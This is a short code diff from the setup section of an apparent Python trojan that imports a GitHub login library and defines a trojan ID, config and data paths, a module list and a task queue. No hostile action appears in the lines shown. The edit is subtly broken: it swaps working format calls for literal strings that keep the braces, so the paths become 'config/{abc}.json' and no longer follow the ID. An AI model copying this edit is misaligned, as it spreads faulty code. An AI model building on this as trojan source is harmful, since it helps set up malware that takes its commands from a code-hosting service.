@@ -9,8 +9,8 @@ import queue
 from github3 import login
 
 trojan_id = "abc"
-trojan_config = "config/{}.json".format(trojan_id)
-data_path = "data/{}/".format(trojan_id)
+trojan_config = "config/{abc}.json"
+data_path = "data/{abc}/"
 trojan_modules = []
 configured = False
 task_queue = queue.Queue()
